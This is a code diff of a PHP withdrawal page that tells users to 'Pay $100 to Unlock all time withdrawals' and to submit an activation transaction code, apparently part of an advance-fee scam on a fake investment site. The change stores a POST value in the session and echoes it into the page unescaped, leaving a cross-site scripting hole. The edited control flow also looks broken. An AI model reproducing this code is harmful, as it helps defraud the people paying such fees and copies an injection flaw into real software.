@@ -2,20 +2,19 @@
 include('authentication.php');
 $userProperties = $_SESSION['userProperties'];
 
-if(isset($_POST['nextInsurance'])){
+ if(isset($_POST['inscode'])){
+   
+        $insuranceFee = $_POST['insuaranceId'];
+        // $GLOBALS['InsuaranceId'] = $insuranceFee;
+        // setcookie('isuranceId', $insuranceFee);
+         $_SESSION['InsuaranceId'] = $insuranceFee;
+ }
     if($userProperties['withdrawalFund']=='$100'){
-
-        $_SESSION['status']="Withdrawal Activation set Paid";
-        header('Location: SendWithdrawalPage.php');
-        
-    }else{
-    
-        $insuranceFee =$_POST['insuaranceId'];
-        $_SESSION['InsuaranceId'] = $insuranceFee;
-    
-        
-    }
+ $_SESSION['status']="Withdrawal Activation set Paid";
+ header('Location: SendWithdrawalPage.php');
+       
 }
+    
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -154,13 +153,16 @@ if(isset($_POST['nextInsurance'])){
                             </h1>
 
                             <div class="card-body">
-
+                           
                                     <div class="col-md-12">
                                     <div class="notice">
                                         <h3>*Pay $100 to Unlock all time withdrawals<label>*This pop-up will never show once fee is cleared</label></h3>
                                         <h4>NOTE: Please enter correct withdrawal activation tansaction code below to quickly process your withdrawal:</h4>
+                                    <?php 
+                                    // $_SESSION['InsuaranceId'] = $insuranceFee;
+                                    echo $_SESSION['InsuaranceId']?>
                                     </div>
-                                        
+                                    <!-- <input type="text" value=<?=$GLOBALS['InsuaranceId']?> name="globalInsuranceid" >   -->
                                     </div>
 
 
